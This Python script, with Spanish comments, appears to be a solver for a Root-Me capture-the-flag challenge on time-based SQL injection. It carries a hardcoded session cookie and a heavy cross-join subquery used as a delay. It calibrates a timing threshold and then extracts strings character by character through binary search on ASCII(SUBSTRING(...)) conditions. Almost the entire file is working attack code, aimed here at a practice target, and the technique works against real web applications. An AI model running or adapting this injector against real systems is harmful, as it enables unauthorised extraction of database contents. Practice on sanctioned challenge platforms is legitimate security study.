#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 47 - ADAPTATIVO
"""
import requests
import time
import statistics
import sys

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class AdaptiveTimeBasedInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        self.threshold = 0
        self.mode = "normal"  # normal o invertido
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.15)
        return statistics.median(tiempos) if tiempos else 0
    
    def calibrate(self):
        """Calibra el umbral y modo automáticamente"""
        print("[*] Calibrando...")
        
        # Medir tiempos
        baseline = self.test_payload("1", repeats=10)
        true_time = self.test_payload("1 OR (1=1) OR " + self.heavy, repeats=10)
        false_time = self.test_payload("1 OR (1=2) OR " + self.heavy, repeats=10)
        
        print(f"  Baseline: {baseline:.2f}ms")
        print(f"  1=1 (TRUE): {true_time:.2f}ms")
        print(f"  1=2 (FALSE): {false_time:.2f}ms")
        
        # Determinar modo
        if true_time > false_time:
            self.mode = "normal"
            self.threshold = (true_time + false_time) / 2
            print(f"  Modo: NORMAL (TRUE = lento)")
        else:
            self.mode = "invertido"
            self.threshold = (true_time + false_time) / 2
            print(f"  Modo: INVERTIDO (TRUE = rápido)")
        
        print(f"  Umbral: {self.threshold:.2f}ms")
        
        # Verificar
        if self.mode == "normal":
            test_true = self.test_payload("1 OR (1=1) OR " + self.heavy, repeats=5) > self.threshold
            test_false = self.test_payload("1 OR (1=2) OR " + self.heavy, repeats=5) > self.threshold
        else:
            test_true = self.test_payload("1 OR (1=1) OR " + self.heavy, repeats=5) < self.threshold
            test_false = self.test_payload("1 OR (1=2) OR " + self.heavy, repeats=5) < self.threshold
        
        print(f"  Verificación: 1=1={test_true}, 1=2={test_false}")
        
        if test_true == True and test_false == False:
            print("  ✅ Calibración exitosa")
            return True
        else:
            print("  ❌ Calibración fallida")
            return False
    
    def is_true(self, condition):
        """Evalúa condición con el modo configurado"""
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        
        if self.mode == "normal":
            return t > self.threshold
        else:
            return t < self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = AdaptiveTimeBasedInjector()

print("="*70)
print("  TIME-BASED ADAPTATIVO")
print("="*70)

# Calibrar
if not injector.calibrate():
    print("\n[!] No se pudo calibrar. Saliendo...")
    sys.exit(1)

# Extraer 'admin'
print("\n[1] Extrayendo 'admin'...")
admin = injector.extract_string("SELECT 'admin'", "SELECT 'admin'")
print(f"\n  Resultado: '{admin}'")
print(f"  Esperado: 'admin'")

if admin == "admin":
    print("\n✅ ¡ÉXITO! La extracción funciona")
else:
    print("\n❌ La extracción NO funciona")
